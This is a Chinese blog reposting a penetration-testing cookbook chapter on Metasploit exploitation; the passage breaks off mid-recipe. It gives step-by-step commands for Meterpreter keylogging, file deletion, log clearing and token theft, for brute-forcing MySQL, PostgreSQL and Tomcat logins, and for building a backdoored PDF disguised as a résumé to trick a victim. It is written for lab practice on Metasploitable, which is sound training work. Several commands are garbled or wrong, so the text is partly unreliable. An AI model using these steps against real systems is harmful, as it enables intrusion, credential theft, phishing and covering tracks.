<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>第六章 漏洞利用 - 《骇客修成秘籍》 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="第六章 漏洞利用 - 《骇客修成秘籍》" />
<meta property="og:description" content="第六章 漏洞利用 作者：Julian Paul Assange
简介 一旦我们完成了漏洞扫描步骤，我们就了解了必要的知识来尝试利用目标系统上的漏洞。这一章中，我们会使用不同的工具来操作，包括系统测试的瑞士军刀 Metasploit。
这个秘籍中，我们会安装、配置和启动 Metasploitable 2。 Metasploitable 是基于 Linux 的操作系统，拥有多种可被 Metasploit 攻击的漏洞。它由 Rapid7 （Metasploit 框架的所有者）设计。Metasploitable 是个熟悉 Meterpreter 用法的极好方式。
准备 为了执行这个秘籍，我们需要下列东西：
互联网连接
VirtualBox PC 上的可用空间
解压缩工具（这里我们使用 Windows 上的 7-Zip）
操作步骤 让我们开始下载 Metasploitable 2。最安全的选择是从 SourceForge 获取下载包：
从这个链接下载 Metasploitable 2：。
将文件包括到硬盘的某个位置。
解压文件。
将文件夹内容放到你储存虚拟磁盘文件的位置。
打开 VirtualBox 并点击New按钮：
点击Next。
输入 Metasploitable 2 的名称并将Operating System:选择为Linux，Version:选项Ubuntu。像下面的截图那样点击Next。
如果可用的话，选择 512 MB，并点击Next。
选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。
你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。
![第六章 漏洞利用 - 图6](https://img-blog." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/59473d66de0f83f55eb8450474776d7b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-21T19:10:09+08:00" />
<meta property="article:modified_time" content="2024-01-21T19:10:09+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">第六章 漏洞利用 - 《骇客修成秘籍》</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="__0"></a>第六章 漏洞利用</h3> 
<blockquote> 
 <p>作者：Julian Paul Assange</p> 
</blockquote> 
<h3><a id="_5"></a>简介</h3> 
<p>一旦我们完成了漏洞扫描步骤，我们就了解了必要的知识来尝试利用目标系统上的漏洞。这一章中，我们会使用不同的工具来操作，包括系统测试的瑞士军刀 Metasploit。</p> 
<p>这个秘籍中，我们会安装、配置和启动 Metasploitable 2。 Metasploitable 是基于 Linux 的操作系统，拥有多种可被 Metasploit 攻击的漏洞。它由 Rapid7 （Metasploit 框架的所有者）设计。Metasploitable 是个熟悉 Meterpreter 用法的极好方式。</p> 
<h4><a id="_11"></a>准备</h4> 
<p>为了执行这个秘籍，我们需要下列东西：</p> 
<ul><li> <p>互联网连接</p> </li><li> <p>VirtualBox PC 上的可用空间</p> </li><li> <p>解压缩工具（这里我们使用 Windows 上的 7-Zip）</p> </li></ul> 
<h4><a id="_22"></a>操作步骤</h4> 
<p>让我们开始下载 Metasploitable 2。最安全的选择是从 SourceForge 获取下载包：</p> 
<ol><li> <p>从这个链接下载 Metasploitable 2：。</p> </li><li> <p>将文件包括到硬盘的某个位置。</p> </li><li> <p>解压文件。</p> </li><li> <p>将文件夹内容放到你储存虚拟磁盘文件的位置。</p> </li><li> <p>打开 VirtualBox 并点击<code>New</code>按钮：</p> <p><img src="https://images2.imgbox.com/0b/98/RQf9ufaP_o.jpg" alt="第六章 漏洞利用 - 图1"></p> </li><li> <p>点击<code>Next</code>。</p> <p><img src="https://images2.imgbox.com/9e/10/GQwWkzxn_o.jpg" alt="第六章 漏洞利用 - 图2"></p> </li><li> <p>输入 Metasploitable 2 的名称并将<code>Operating System:</code>选择为<code>Linux</code>，<code>Version:</code>选项<code>Ubuntu</code>。像下面的截图那样点击<code>Next</code>。</p> <p><img src="https://images2.imgbox.com/fe/80/vN43xTxF_o.jpg" alt="第六章 漏洞利用 - 图3"></p> </li><li> <p>如果可用的话，选择 <code>512 MB</code>，并点击<code>Next</code>。</p> <p><img src="https://images2.imgbox.com/2c/00/nLSHd0Xv_o.jpg" alt="第六章 漏洞利用 - 图4"></p> </li><li> <p>选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。</p> <p><img src="https://images2.imgbox.com/57/04/Fqquwq10_o.jpg" alt="第六章 漏洞利用 - 图5"></p> </li><li> <p>你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。</p> </li></ol> 
<pre><code>![第六章 漏洞利用 - 图6](https://img-blog.csdnimg.cn/img_convert/dc53086218767222dc9a88c6db0fa3bf.jpeg)
</code></pre> 
<ol start="11"><li>点击<code>Create</code>。</li></ol> 
<pre><code>![第六章 漏洞利用 - 图7](https://img-blog.csdnimg.cn/img_convert/65d502293a4eac652af946e66acc56a8.jpeg)
</code></pre> 
<ol start="12"><li>通过点击 Metasploitable 2 的名称和<code>Start</code>按钮来启动它。</li></ol> 
<h4><a id="_65"></a>工作原理</h4> 
<p>这个秘籍中，我们在 Virtualbox 中配置了 Metasploitable 2。我们以从<code>Sourceforge.net</code>下载 Metasploitable 开始这个秘籍，之后我们配置了 VDMK 来在 VirtualBox 中运行并以启动该系统结束。</p> 
<p>新版本的 Metasploit 使用叫做 Armitage 的图形化前端工具。理解 Armitage 非常重要，因为它通过提供可视化的信息，使你对 Metasploit 的使用变得简单。它封装了 Metasploit 控制台，并且通过使用它的列表功能，你可以一次看到比 Metasploit 控制台或 Meterpreter 会话更多的内容。</p> 
<h4><a id="_71"></a>准备</h4> 
<p>需要互联网或内部网络的连接。</p> 
<h4><a id="_75"></a>操作步骤</h4> 
<p>让我们开始操作 Armitage：</p> 
<ol><li> <p>从桌面上访问<code>Start | Kali Linux | Exploitation Tools | Network Exploitation Tools | Armitage</code>。</p> <p><img src="https://images2.imgbox.com/c7/0c/3gIBu9Ok_o.jpg" alt="第六章 漏洞利用 - 图8"></p> </li><li> <p>在 Armitage的登录界面中，点击<code>Connect</code>（连接）按钮。</p> <p><img src="https://images2.imgbox.com/77/92/etjIxem3_o.jpg" alt="第六章 漏洞利用 - 图9"></p> </li><li> <p>Armitage 可能需要一些时间来连接 Metasploit。当它完成时，你可能看见下面的提示窗口。不要惊慌，一旦 Armitage 能够连接时，它会消失的。在<code>Start Metaspoit?</code>界面，点击<code>Yes</code>：</p> <p><img src="https://images2.imgbox.com/84/b8/LPV2RjfH_o.jpg" alt="第六章 漏洞利用 - 图10"></p> </li><li> <p>随后你会看到 Armitage 的主窗口。我们现在讨论主窗口的三个区域（标记为<code>A</code>、<code>B</code>和<code>C</code>，在下面的截图中）。</p> 
  <ul><li> <p><code>A</code>：这个区域展示了预先配置的模块。你可以通过模块列表下面的搜索框来搜索。</p> </li><li> <p><code>B</code>：这个区域展示了你的活动目标，我们能够利用它的漏洞。</p> </li><li> <p><code>C</code>：这个区域展示了多个 Metasploit 标签页。它允许多个 Meterpreter 或控制台会话同时运行和展示。</p> </li></ul> <p><img src="https://images2.imgbox.com/71/2c/U4hn67Bg_o.jpg" alt="第六章 漏洞利用 - 图11"></p> 
  <blockquote> 
   <p>启动 Armitage 的一个自动化方式就是在终端窗口中键入下列命令。</p> 
   <pre><code>armitage
</code></pre> 
  </blockquote> </li></ol> 
<h4><a id="_109"></a>另见</h4> 
<p>为了了解更多 Meterpreter 的信息，请见“掌握 Meterpreter”一节。</p> 
<p>这个秘籍中，我们会研究 Metasploit 控制台（MSFCONSOLE）。MSFCONSOLE主要用于管理 Metasploit 数据库，管理会话以及配置和启动 Metasploit 模块。本质上，出于利用漏洞的目的，MSFCONSOLE 能够让你连接到主机，便于你利用它的漏洞。</p> 
<p>你可以使用以下命令来和控制台交互：</p> 
<ul><li> <p><code>help</code>：这个命令允许你查看你尝试运行的命令行的帮助文档。</p> </li><li> <p><code>use module</code>：这个命令允许你开始配置所选择的模块。</p> </li><li> <p><code>set optionname module</code>：这个命令允许你为指定的模块配置不同的选项。</p> </li><li> <p><code>exploit</code>：这个命令启动漏洞利用模块。</p> </li><li> <p><code>run</code>：这个命令启动非漏洞利用模块。</p> </li><li> <p><code>search module</code>：这个命令允许你搜索独立模块。</p> </li><li> <p><code>exit</code>：这个命令允许你退出 MSFCONSOLE。</p> </li></ul> 
<h4><a id="_132"></a>准备</h4> 
<p>需要互联网或内部网络的连接。</p> 
<h4><a id="_136"></a>操作步骤</h4> 
<p>让我们开始探索 MSFCONSOLE：</p> 
<ol><li> <p>打开命令行。</p> </li><li> <p>通过下列命令启动 MSFCONSOLE：</p> <pre><code>msfconsole
</code></pre> </li><li> <p>通过<code>search</code>命令搜索所有可用的 Linux 模块。每次我们打算执行操作时，都搜索一遍模块通常是个好主意。主要因为在 Metasploit 的不同版本之间，模块路径可能发生改变。</p> <pre><code>search linux
</code></pre> <p><img src="https://images2.imgbox.com/e8/fe/D4ai3r7b_o.jpg" alt="第六章 漏洞利用 - 图12"></p> </li><li> <p>使用 John the Ripper Linux 密码破解模块。</p> <pre><code>use auxiliary/analyzse/jtr_linux
</code></pre> <p><img src="https://images2.imgbox.com/bd/71/47TVrset_o.jpg" alt="第六章 漏洞利用 - 图13"></p> </li><li> <p>通过下列命令展示该模块的可用选项。</p> <pre><code>show options
</code></pre> <p><img src="https://images2.imgbox.com/5b/2d/p1JlQhsa_o.jpg" alt="第六章 漏洞利用 - 图14"></p> </li><li> <p>既然我们列出了可以对这个模块使用的选项，我们可以使用<code>set</code>命令来设置独立选项。让我们设置<code>JOHN_PATH</code>选项：</p> <pre><code>set JOHN_PATH /usr/share/metasploit-framework/data/john/wordlists/ password.lst
</code></pre> </li><li> <p>现在执行漏洞利用，我们需要输入<code>exploit</code>命令：</p> <pre><code>exploit
</code></pre> </li></ol> 
<h4><a id="_185"></a>更多</h4> 
<p>一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的回话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。</p> 
<p>这个秘籍中，我们会探索 Metasploit CLI（MSFCLI）。Metasploit 需要接口来执行它的任务。MSFCLI 就是这样的接口。它是一个极好的接口，用于学习 Metasploit ，或测试/编写新的漏洞利用。它也可用于脚本的情况中，并且对任务使用基本的自动化。</p> 
<p>使用 MSFCLI 的一个主要问题是，你只能够一次打开一个 shell。你也会注意到，当我们探索一些命令的时候，它比 MSFCONSOLE 慢并且复杂。最后，你需要知道你打算利用的具体漏洞来使用 MSFCLI。这会使它对于渗透测试新手有些难以使用，他们并不熟悉 Metasploit 漏洞利用列表。</p> 
<p>MSFCLI 的一些命令是：</p> 
<ul><li> <p><code>msfcli</code>：这会加载 MSFCLI 可访问的所有可用漏洞利用列表。</p> </li><li> <p><code>msfcli -h</code>：显示 MSFCLI 的帮助文档。</p> </li><li> <p><code>msfcli [PATH TO EXPLOIT] [options = value]</code>：这是执行漏洞利用的语法。</p> </li></ul> 
<h4><a id="_202"></a>准备</h4> 
<p>需要互联网或内部网络的连接。</p> 
<h4><a id="_206"></a>操作步骤</h4> 
<p>让我们开始探索 MSFCLI：</p> 
<ol><li> <p>使用下列命令启动 Metasploit CLI （MSFCLI）。请耐心等待，因为这可能花一些时间，取决于你的系统速度。同时注意当 MSFCLI 加载完成时，会显示可用的漏洞利用列表。</p> <pre><code>msfcli
</code></pre> <p><img src="https://images2.imgbox.com/84/d4/jQN4Scz4_o.jpg" alt="第六章 漏洞利用 - 图15"></p> </li><li> <p>显示 MSFCLI 帮助文档：</p> <pre><code>msfcli -h
</code></pre> <p><img src="https://images2.imgbox.com/a7/d3/frSuxYb8_o.jpg" alt="第六章 漏洞利用 - 图16"></p> </li><li> <p>出于我们的演示目的，我们会执行圣诞树扫描（ Christmas Tree Scan）。我们会选择选项 A 来显示模块高级选项。</p> <pre><code>msfcli auxiliary/scanner/portscan/xmas A
</code></pre> 
  <blockquote> 
   <p>更多圣诞树扫描的信息，请见下面的 URL：<a href="http://en.wikipedia.org/wiki/Christmas_tree_packet" rel="nofollow">http://en.wikipedia.org/wiki/Christmas_tree_packet</a>。</p> 
  </blockquote> <p><img src="https://images2.imgbox.com/b6/e5/E31LvE2g_o.jpg" alt="第六章 漏洞利用 - 图17"></p> </li><li> <p>此外，你可以列出当前模块的概览，通过使用<code>S</code>模式。概览模式是一个极好方式，来查看可用于当前尝试执行的漏洞利用的所有选项。许多选项都是可选的，但是一小部分通常是必须的，它们允许你设置尝试利用哪个目标或端口的漏洞。</p> <pre><code>msfcli auxiliary/scanner/portscan/xmas S
</code></pre> <p><img src="https://images2.imgbox.com/39/05/U9syxozz_o.jpg" alt="第六章 漏洞利用 - 图18"></p> </li><li> <p>为了展示可用于此次漏洞利用的选项列表，我们使用<code>O</code>模式。选项使用中配置漏洞利用模块的方式。每个利用模块都用不同的选项集合（或者什么都没有）。任何所需的选项必须在漏洞利用执行之前设置。在下面的截图中，你会注意到许多所需选项都设为默认。如果你碰到了这种情况，你就不需要更新选项的值，除非你打算修改它。</p> <pre><code>msfcli auxiliary/scanner/portscan/xmas O
</code></pre> <p><img src="https://images2.imgbox.com/82/77/6wYEB3Aa_o.jpg" alt="第六章 漏洞利用 - 图19"></p> </li><li> <p>我们使用<code>E</code>模式来执行漏洞利用。</p> <pre><code>msfcli auxiliary/scanner/portscan/xmas E
</code></pre> 
  <blockquote> 
   <p>这里，我们使用了默认选项。</p> 
  </blockquote> </li></ol> 
<h4><a id="_261"></a>工作原理</h4> 
<p>这个秘籍中，我们以启动 MSFCLI 开始，之后搜索可用的模块，并执行该模块。在搜索的过程中，我们选修了圣诞树扫描模块并复查了 MSFCLI 界面来查看模块概览和所有可用选项。在设置完所有选项之后，我们执行了漏洞利用。</p> 
<p>了解 Metasploit 框架分为三个不同的部分非常重要。这些部分是：</p> 
<ul><li> <p>漏洞：这些都是弱点，要么已知要么位置。它们包含在特定的应用、阮家宝或协议中。在 Metasploit 中，漏洞按照分组，和漏洞利用列出，漏洞利用可以攻击列在它们下面的漏洞。</p> </li><li> <p>漏洞利用：漏洞利用是用来利用所发现漏洞的模块。</p> </li><li> <p>载荷：一旦成功执行了漏洞利用，必须把载荷传给被攻击的机器，以便允许我们创建 shell，运行各种命令，添加用户以及其它。</p> </li></ul> 
<p>一旦你通过 MSFCONSOLE 获得了主机的访问，你需要使用 Meterpreter 来分发载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。</p> 
<h3><a id="65__Meterpreter_276"></a>6.5 掌握 Meterpreter</h3> 
<p>一旦你使用 Armitage，MSFCLI 或 MSFCONSOLE 获得了主机的访问权，你必须使用 Meterpreter 来传递你的载荷。MSFCONSOLE 可以管理你的会话，而 Meterpreter 执行实际的载荷分发和漏洞利用工作。</p> 
<p>一些用于 Meterpreter 的常用命令包括：</p> 
<ul><li> <p><code>help</code>：这个命令允许你浏览帮助文档。</p> </li><li> <p><code>background</code>：这个命令允许你在后台运行 Meterpreter 会话。这个命令也能为你带回 MSF 提示符。</p> </li><li> <p><code>download</code>：这个命令允许你从受害者机器中下载文件。</p> </li><li> <p><code>upload</code>：这个命令允许你向受害者机器上传文件。</p> </li><li> <p><code>execute</code>：这个命令允许你在受害者机器上运行命令。</p> </li><li> <p><code>shell</code>：这个命令允许你在受害者机器上运行 Windows shell 提示符（仅限于 Windows 主机）。</p> </li><li> <p><code>session -i</code>：这个命令允许你在会话之间切换。</p> </li></ul> 
<h4><a id="_297"></a>准备</h4> 
<p>需要满足下列要求：</p> 
<ul><li> <p>内部网络或互联网的连接。</p> </li><li> <p>使用 Armitage，MSFCLI 或 MSFCONSOLE 由 Metasploit 创建好的，目标系统的活动会话。</p> </li></ul> 
<h4><a id="_306"></a>操作步骤</h4> 
<p>让我们打开 MSFCONSOLE 来开始：</p> 
<ol><li> <p>首先我们以 MSFCONSOLE 中展示的活动会话开始。</p> </li><li> <p>开始记录目标系统中用户的击键顺序：</p> <pre><code>keyscan_start
</code></pre> </li><li> <p>转储目标系统中用户的击键顺序。击键顺序会显示在屏幕上：</p> <pre><code>keyscan_dump
</code></pre> </li><li> <p>停止记录目标系统中用户的击键顺序。</p> <pre><code>keyscan_stop
</code></pre> </li><li> <p>删除目标系统中的文件。</p> <pre><code>del exploited.docx
</code></pre> </li><li> <p>清除目标系统中的事件日志。</p> <pre><code>clearav
</code></pre> </li><li> <p>展示运行进程的列表。</p> <pre><code>ps
</code></pre> </li><li> <p>杀掉受害者系统的指定进程，使用<code>kill [pid]</code>语法。</p> <pre><code>kill 6353
</code></pre> </li><li> <p>尝试偷取目标系统上的模拟令牌。</p> <pre><code>steal_token
</code></pre> </li></ol> 
<h4><a id="_361"></a>工作原理</h4> 
<p>我们以通过 Armitage，MSFCLI 或 MSFCONSOLE 预先建立的 Meterpreter 会话来开始。之后我们在目标机器上运行了多种命令。</p> 
<h4><a id="_365"></a>更多</h4> 
<p>当我们对基于 Linux 主机使用 Meterpreter 的时候，我们能够在它上面运行 Linux 命令，就像我们操作这台机器那样。</p> 
<p>这个秘籍中，我们会探索如何使用 Metasploit 来攻击 MySQL 数据库服务器，使用 MySQL 扫描器模块。MySQL 是许多网站平台的选择，包括 Drupal 和 Wordpress，许多网站当前正在使用 MySQL 数据库服务器。这会使它们更容易成为 Metasploitable MySQL 攻击的目标。</p> 
<h4><a id="_371"></a>准备</h4> 
<p>需要满足下列要求：</p> 
<ul><li> <p>内部网络的连接。</p> </li><li> <p>运行在渗透环境中的 Metasploitable 。</p> </li><li> <p>用于执行字典攻击的单词列表。</p> </li></ul> 
<h4><a id="_382"></a>操作步骤</h4> 
<p>让我们通过打开终端窗口来开始 MySQL 攻击：</p> 
<ol><li> <p>打开终端窗口。</p> </li><li> <p>启动 MSFCONSOLE。</p> <pre><code>msfconsole
</code></pre> </li><li> <p>搜索可用的 MySQL 模块。</p> <pre><code>msfconsole mysql
</code></pre> <p><img src="https://images2.imgbox.com/b3/98/GZhhUpop_o.jpg" alt="第六章 漏洞利用 - 图20"></p> </li><li> <p>使用 MySQL 扫描器模块。</p> <pre><code>use auxiliary/scanner/mysql/mysql_login
</code></pre> <p><img src="https://images2.imgbox.com/52/f0/6LlZtOAd_o.jpg" alt="第六章 漏洞利用 - 图21"></p> </li><li> <p>显示模块的可用选项。</p> <pre><code>show options
</code></pre> <p><img src="https://images2.imgbox.com/70/ac/M7fXU4aV_o.jpg" alt="第六章 漏洞利用 - 图22"></p> </li><li> <p>将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。</p> <pre><code>set RHOST 192.168.10.111
</code></pre> </li><li> <p>设置用户名文件的位置。你可以选择：</p> <pre><code>set user_file /root/Desktop/usernames.txt
</code></pre> </li><li> <p>设置密码文件的位置。你可以选择：</p> <pre><code>set pass_file /root/Desktop/passwords.txt
</code></pre> </li><li> <p>执行漏洞利用：</p> <pre><code>Exploit
</code></pre> <p><img src="https://images2.imgbox.com/35/c3/xDSALZuz_o.jpg" alt="第六章 漏洞利用 - 图23"></p> </li><li> <p>Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的<code>+</code>符号就可以了。</p> </li></ol> 
<h4><a id="_447"></a>工作原理</h4> 
<p>这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用 Metasploitable 2 靶机上的 MySQL 漏洞。我们以启动控制台并搜索所有已知的 MySQL 模块来开始。在选择 MySQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 MySQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 MySQL 数据库。</p> 
<h4><a id="_451"></a>更多</h4> 
<p>这个秘籍中，我们使用了自己生成的用户名和密码文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。</p> 
<h3><a id="67_Metasploitable_PostgreSQL_455"></a>6.7 Metasploitable PostgreSQL</h3> 
<p>这个秘籍中，我们会探索如何使用 Metasploit 来攻击 PostgreSQL 数据库服务器，使用 PostgreSQL 扫描器模块。PostgreSQL 被誉为全世界最先进的开源数据库，许多爱好者声称它是企业级的数据库。我们会使用 Metasploit 来爆破 PostgreSQL 登录。</p> 
<h4><a id="_459"></a>准备</h4> 
<p>需要满足下列要求：</p> 
<ul><li> <p>内部网络的连接。</p> </li><li> <p>运行在渗透环境中的 Metasploitable 。</p> </li><li> <p>用于执行字典攻击的单词列表。</p> </li></ul> 
<h4><a id="_470"></a>操作步骤</h4> 
<p>让我们通过打开终端窗口来开始 PostgreSQL 攻击：</p> 
<ol><li> <p>打开终端窗口。</p> </li><li> <p>启动 MSFCONSOLE。</p> <pre><code>msfconsole
</code></pre> </li><li> <p>搜索可用的 PostgreSQL 模块。</p> <pre><code>msfconsole postgresql
</code></pre> <p><img src="https://images2.imgbox.com/d2/14/Z7iyGhhN_o.jpg" alt="第六章 漏洞利用 - 图24"></p> </li><li> <p>使用 PostgreSQL 扫描器模块。</p> <pre><code>use auxiliary/scanner/mysql/postgres_login
</code></pre> <p><img src="https://images2.imgbox.com/c0/52/daifNN7v_o.jpg" alt="第六章 漏洞利用 - 图25"></p> </li><li> <p>显示模块的可用选项。</p> <pre><code>show options
</code></pre> </li><li> <p>将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。</p> <pre><code>set RHOST 192.168.10.111
</code></pre> </li><li> <p>设置用户名文件的位置。你可以选择：</p> <pre><code>set user_file /root/Desktop/usernames.txt
</code></pre> </li><li> <p>设置密码文件的位置。你可以选择：</p> <pre><code>set pass_file /root/Desktop/passwords.txt
</code></pre> </li><li> <p>执行漏洞利用：</p> <pre><code>Exploit
</code></pre> </li><li> <p>Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的<code>+</code>符号就可以了。</p> </li></ol> 
<h4><a id="_531"></a>工作原理</h4> 
<p>这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用 Metasploitable 2 靶机上的 PostgreSQL 漏洞。我们以启动控制台并搜索所有已知的 PostgreSQL 模块来开始。在选择 PostgreSQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 PostgreSQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 PostgreSQL 数据库。之后找到生效的登录和密码组合旁边的<code>+</code>符号就可以了。</p> 
<h4><a id="_535"></a>更多</h4> 
<p>这个秘籍中，我们使用了默认的 PostgreSQL 用户名和密码文件。然而我们也可以创建自己的文件。有许多方法可以生成用户名和密码单词列表，这些方法在第八章中涉及。</p> 
<p>这个秘籍中，我们会探索如何使用 Metasploit 攻击 Tomcat 服务器，使用 Tomcat Manager Login 模块。Tomcat，或 Apache Tomcat，是开源的 Web 服务器，和 Servlet 容器，用于运行 Java Servt 和 JSP。Tomcat 服务器纯粹使用 Java 编写。我们会使用 Metasploit 来爆破 Tomcat 的登录。</p> 
<h4><a id="_541"></a>准备</h4> 
<p>需要满足下列要求：</p> 
<ul><li> <p>内部网络的连接。</p> </li><li> <p>运行在渗透环境中的 Metasploitable 。</p> </li><li> <p>用于执行字典攻击的单词列表。</p> </li></ul> 
<h4><a id="_552"></a>操作步骤</h4> 
<p>让我们通过打开终端窗口来开始这个秘籍：</p> 
<ol><li> <p>打开终端窗口。</p> </li><li> <p>启动 MSFCONSOLE。</p> <pre><code>msfconsole
</code></pre> </li><li> <p>搜索可用的 Tomcat 模块。</p> <pre><code>msfconsole tomcat
</code></pre> <p><img src="https://images2.imgbox.com/d4/58/QyBrmiIM_o.jpg" alt="第六章 漏洞利用 - 图26"></p> </li><li> <p>使用 Tomcat Application Manager Login Utility。</p> <pre><code>use auxiliary/scanner/http/tomcat_mgr_login
</code></pre> </li><li> <p>显示模块的可用选项。</p> <pre><code>show options
</code></pre> 
  <blockquote> 
   <p>要注意我们有很多设置为“是”的项目，它们都是必须的。我们使用它们的默认值。</p> 
  </blockquote> </li><li> <p>设置<code>Pass_File</code>：</p> <pre><code>PASS_FILE meset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
</code></pre> </li><li> <p>设置<code>Pass_File</code>：</p> <pre><code>USER_FILE mset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
</code></pre> </li><li> <p>设置目标的<code>RHOST</code>，这里我们选择我们的 Metasploitable 2 主机：</p> <pre><code>set RHOSTS 192.168.10.111
</code></pre> </li><li> <p>将<code>RPORT</code>设置为 8180：</p> <pre><code>set RPORT 8180
</code></pre> </li><li> <p>执行漏洞利用：</p> </li></ol> 
<pre><code>```
Exploit
```
</code></pre> 
<h4><a id="_617"></a>工作原理</h4> 
<p>这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来利用 Metasploitable 2 靶机上的 Tomcat 漏洞。我们以启动控制台并搜索所有已知的 Tomcat 模块来开始。在选择 Tomcat 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 Tomcat 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 Tomcat 数据库。之后找到生效的登录和密码组合旁边的<code>+</code>符号就可以了。</p> 
<p>这个秘籍中，我们会探索如何使用 Metasploit 来执行攻击，使用 Adobe PDF 内嵌模块来利用 PDF 文档漏洞。Adobe PDF 是文档传输的标准。由于它的广泛使用，尤其是由于它的商业用途，我们会通过让用户认为他们打开了来自求职岗位的正常 PDF 文档来攻击用户的机器。</p> 
<h4><a id="_623"></a>准备</h4> 
<p>需要满足下列要求：</p> 
<ul><li> <p>内部网络的连接。</p> </li><li> <p>运行在渗透环境中的 Metasploitable 。</p> </li><li> <p>用于执行字典攻击的单词列表。</p> </li></ul> 
<h4><a id="_634"></a>操作步骤</h4> 
<p>让我们通过打开终端窗口来开始这个秘籍：</p> 
<ol><li> <p>打开终端窗口。</p> </li><li> <p>启动 MSFCONSOLE。</p> <pre><code>msfconsole
</code></pre> </li><li> <p>搜索可用的 PDF 模块。</p> <pre><code>msfconsole pdf
</code></pre> <p><img src="https://images2.imgbox.com/9b/f3/J4eIRhOr_o.jpg" alt="第六章 漏洞利用 - 图27"></p> </li><li> <p>使用 PDF 内嵌模块：</p> <pre><code>use exploit/windows/fileformat/adobe_pdf_embedded_exe
</code></pre> </li><li> <p>显示模块的可用选项。</p> <pre><code>show options
</code></pre> <p><img src="https://images2.imgbox.com/e1/e7/xfpNWBRG_o.jpg" alt="第六章 漏洞利用 - 图28"></p> </li><li> <p>设置我们想要生成的 PDF 文件名称：</p> <pre><code>set FILENAME evildocument.pdf
</code></pre> </li><li> <p>设置 INFILENAME 选项。它是你打算使用的 PDF 文件的位置。这里，我使用桌面上的简历。</p> <pre><code>set INFILENAME /root/Desktop/willie.pdf
</code></pre> 
  <blockquote> 
   <p>要注意，这个模块的所有选项都是可选的，除了<code>INFILENAME</code>。</p> 
  </blockquote> </li><li> <p>执行漏洞利用：</p> <pre><code>Exploit
</code></pre> <p><img src="https://images2.imgbox.com/bd/4e/AkwWp9Io_o.jpg" alt="第六章 漏洞利用 - 图29"></p> </li></ol> 
<h4><a id="_691"></a>工作原理</h4> 
<p>这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 创建了包含 Meterpreter 后门的 PDF 文件。我们以启动控制台并搜索所有可用的 PDF 漏洞来开始。在选择 PDF 内嵌模块之后，我们设置选项并执行漏洞利用，这让我们在正常的 PDF 中埋下后门程序。Metasploit 会生成带有 Windows 反向 TCP 载荷的 PDF。当你的目标打开 PDF 文件时，Meterpreter 会开启答复并激活会话。</p> 
<h3><a id="610__browser_autopwn_695"></a>6.10 实现 browser_autopwn</h3> 
<p>浏览器 Autopwn 是 Metasploit 提供的辅助模块，在受害者访问网页时，让你能够自动化对它们的攻击。浏览器 Autopwn 在攻击之前指定客户端的指纹识别，也就是说他不会对 IE 7 尝试利用 Firefox 的漏洞。基于它的浏览器判断，它决定最适于实施哪个漏洞利用。</p> 
<h4><a id="_699"></a>准备</h4> 
<p>需要互联网或内部网络的连接。</p> 
<h4><a id="_703"></a>操作步骤</h4> 
<p>让我们通过打开终端窗口来开始这个秘籍：</p> 
<ol><li> <p>打开终端窗口。</p> </li><li> <p>启动 MSFCONSOLE：</p> <pre><code>msfconsole
</code></pre> </li><li> <p>搜索可用的 <code>autopwn</code> 模块。</p> <pre><code>msfconsole autopwn
